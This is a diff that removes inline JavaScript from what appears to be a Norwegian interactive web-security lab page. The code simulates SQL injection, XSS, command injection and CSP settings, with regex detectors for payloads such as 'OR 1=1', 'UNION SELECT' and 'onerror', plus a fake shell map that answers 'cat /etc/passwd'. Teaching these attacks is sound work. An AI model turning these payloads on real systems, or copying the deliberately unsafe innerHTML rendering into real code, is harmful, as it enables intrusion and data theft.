-function sqlUQ(){var u=document.getElementById('sql-user').value,p=document.getElementById('sql-pass').value;var bad=/['";\-]|OR|UNION|DROP|SELECT/i.test(u+p);document.getElementById('sql-query').innerHTML='SELECT * FROM users WHERE username=\'<span style="color:'+(bad?'#f87171':'#60a5fa')+'">'+esc(u)+'</span>\' AND password=\'<span style="color:'+(bad?'#f87171':'#60a5fa')+'">'+esc(p)+'</span>\'';document.getElementById('sql-warn').innerHTML=bad?'<span style="color:#f87171;font-size:11px">⚠ Injection oppdaget!</span>':'';}
-function sqlLogin(){var u=document.getElementById('sql-user').value,p=document.getElementById('sql-pass').value,res=document.getElementById('sql-result');res.style.display='block';var bypass=/'\s*OR\s*'?1'?\s*=\s*'?1|'\s*--/i.test(u),ok=u==='admin'&&p==='password123';if(bypass||ok){res.style.cssText='background:#f0fdf4;border:1px solid #86efac;color:#166534;padding:10px;border-radius:6px;font-size:13px;font-weight:600';res.innerHTML='✓ Innlogget som: <strong>admin</strong>'+(bypass?' <span style="color:#dc2626">(via SQL injection!)</span>':'');}else{res.style.cssText='background:#fef2f2;border:1px solid #fca5a5;color:#991b1b;padding:10px;border-radius:6px;font-size:13px;font-weight:600';res.textContent='✗ Feil brukernavn eller passord';}}
-var PROD=[{id:1,name:'Laptop Pro 15',p:'12 999 kr'},{id:2,name:'Trådløs mus',p:'299 kr'},{id:3,name:'USB-hub',p:'199 kr'}];
-var USR=[{u:'admin',p:'password123'},{u:'lars',p:'Summer2024!'},{u:'kari',p:'qwerty123'}];
-function unionS(){var v=document.getElementById('union-q').value,r=document.getElementById('union-res');if(/UNION\s+SELECT/i.test(v)){r.innerHTML='<div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:6px;padding:8px;font-size:11px;color:#991b1b;font-weight:700;margin-bottom:8px">⚠ UNION-angrep! Brukertabell dumpet:</div>'+USR.map(function(u){return '<div class="ts-card" style="border-color:#fca5a5"><div class="ts-card-title" style="color:#991b1b">'+u.u+'</div><div class="ts-card-sub">Passord: <code>'+u.p+'</code></div></div>';}).join('');}else{var pr=PROD.find(function(p){return p.id===parseInt(v);});r.innerHTML=pr?'<div class="ts-card"><div class="ts-card-title">'+pr.name+'</div><div class="ts-card-sub">'+pr.p+'</div></div>':'<div class="ts-card"><div class="ts-card-sub" style="color:#888">Ingen produkt funnet</div></div>';}}
-var UURR=[{id:1,n:'Ola Nordmann',e:'ola@example.no'},{id:2,n:'Kari Hansen',e:'kari@example.no'},{id:3,n:'Lars Elvestad',e:'lars@example.no'}];
-function urlPU(){document.getElementById('url-disp').textContent=document.getElementById('url-p').value;}
-function urlPS(){var v=document.getElementById('url-p').value,r=document.getElementById('url-res');if(document.getElementById('url-disp'))document.getElementById('url-disp').textContent=v;if(/DROP\s+TABLE/i.test(v)){r.innerHTML='<div style="background:#fef2f2;border:2px solid #dc2626;border-radius:8px;padding:16px;text-align:center"><div style="font-size:24px">💥</div><div style="color:#991b1b;font-weight:700">DATABASE SLETTET</div></div>';}else if(/OR\s+1\s*=\s*1/i.test(v)){r.innerHTML='<div style="font-size:11px;color:#dc2626;font-weight:700;margin-bottom:8px">⚠ Alle brukere:</div>'+UURR.map(function(u){return '<div class="ts-card" style="border-color:#fca5a5"><div class="ts-card-title">'+u.n+'</div><div class="ts-card-sub">'+u.e+'</div></div>';}).join('');}else{var u=UURR.find(function(x){return x.id===parseInt(v);});r.innerHTML=u?'<div class="ts-card"><div class="ts-card-title">'+u.n+'</div><div class="ts-card-sub">'+u.e+'</div></div>':'<div class="ts-card"><div class="ts-card-sub" style="color:#888">Ingen bruker</div></div>';}}
-function xssR(){var q=document.getElementById('xss-in').value,st=document.getElementById('xss-st');document.getElementById('xss-url').textContent=encodeURIComponent(q).slice(0,20);document.getElementById('xss-res').innerHTML='Søk: <strong>'+q+'</strong>';if(/onerror|onload|onclick|javascript/i.test(q)){st.className='lab-status err show';st.querySelector('span').textContent='⚠ XSS payload kjørt!';}else if(/<[^>]+>/.test(q)){st.className='lab-status warn show';st.querySelector('span').textContent='HTML injisert';}else{st.className='lab-status ok show';st.querySelector('span').textContent='✓ Normalt søk';}}
-var storC=[{n:'alice',t:'Interessant tråd!'}];
-function storPost(){var n=document.getElementById('stor-name').value||'Anonym',t=document.getElementById('stor-text').value,st=document.getElementById('stor-st');if(!t)return;storC.push({n:n,t:t});storRen();document.getElementById('stor-text').value='';if(/onerror|onload|onclick/i.test(t)){st.className='lab-status err show';st.querySelector('span').textContent='⚠ XSS lagret!';}else{st.className='lab-status ok show';st.querySelector('span').textContent='✓ Kommentar lagt til';}}
-function storRen(){document.getElementById('stor-comments').innerHTML=storC.map(function(c){return '<div class="ts-comment"><div class="ts-comment-author">'+esc(c.n)+'</div><div class="ts-comment-text">'+c.t+'</div></div>';}).join('');}
-function storSim(){var st=document.getElementById('stor-st'),has=storC.some(function(c){return /onerror|onload|onclick/i.test(c.t);});st.className=has?'lab-status err show':'lab-status inf show';st.querySelector('span').textContent=has?'👤 XSS kjørt for ny besøkende!':'Ingen XSS-payload ennå';storRen();}
-function domX(){var v=document.getElementById('dom-in').value,st=document.getElementById('dom-st');document.getElementById('dom-url').textContent=encodeURIComponent(v).slice(0,20);document.getElementById('dom-hi').innerHTML='<div style="font-size:18px;font-weight:700;color:#fff">Hei, '+v+'!</div>';if(/onerror|onload|onclick|javascript/i.test(v)){st.className='lab-status err show';st.querySelector('span').textContent='⚠ DOM XSS! Serveren så aldri payloaden';}else if(/<[^>]+>/.test(v)){st.className='lab-status warn show';st.querySelector('span').textContent='HTML injisert';}else{st.className='lab-status ok show';st.querySelector('span').textContent='✓ Normalt navn';}}
-var CMDR={'8.8.8.8':'PING 8.8.8.8\n64 bytes from 8.8.8.8: icmp_seq=0 time=12ms\n2 packets transmitted, 2 received','whoami':'www-data','id':'uid=33(www-data)','cat /etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin','ls':'index.php\nconfig.php\nupload'};
-function cmdI(){var v=document.getElementById('cmd-in').value,out=document.getElementById('cmd-out'),st=document.getElementById('cmd-st'),parts=v.split(/[;&|]+/).map(function(s){return s.trim();}),res='',inj=false;parts.forEach(function(cmd,i){if(i===0){res+=CMDR['8.8.8.8'];}else{inj=true;res+='\n\n$ '+cmd+'\n'+(CMDR[cmd.toLowerCase()]||cmd+': command not found');}});out.textContent=res;if(inj){st.className='lab-status err show';st.querySelector('span').textContent='⚠ Command Injection!';}else{st.className='lab-status ok show';st.querySelector('span').textContent='✓ Normal ping';}}
-function cspB(){var a=document.getElementById('csp-a').checked,b=document.getElementById('csp-b').checked,c=document.getElementById('csp-c').checked,d=document.getElementById('csp-d').checked,parts=[];if(a)parts.push("default-src 'self'");parts.push(b?"script-src 'self'":"script-src 'self' 'unsafe-inline'");if(c)parts.push("object-src 'none'");if(d)parts.push('upgrade-insecure-requests');document.getElementById('csp-out').textContent='Content-Security-Policy: '+parts.join('; ');var items=[];if(b)items.push({ok:true,t:'Inline scripts blokkert'});else items.push({ok:false,t:'Inline scripts tillatt — XSS mulig!'});if(a)items.push({ok:true,t:'Kun egne ressurser'});if(c)items.push({ok:true,t:'Flash blokkert'});if(d)items.push({ok:true,t:'HTTPS tvinges'});document.getElementById('csp-an').innerHTML=items.map(function(i){return '<div style="font-size:11px;color:'+(i.ok?'#4ade80':'#f87171')+';margin-bottom:4px">'+(i.ok?'✓':'✗')+' '+i.t+'</div>';}).join('');}
-document.addEventListener('DOMContentLoaded',function(){updatePreview();cspB();urlPS();});
-</script>
+<script src="../js/enkel.js?v=5"></script>
 </body>
 </html>
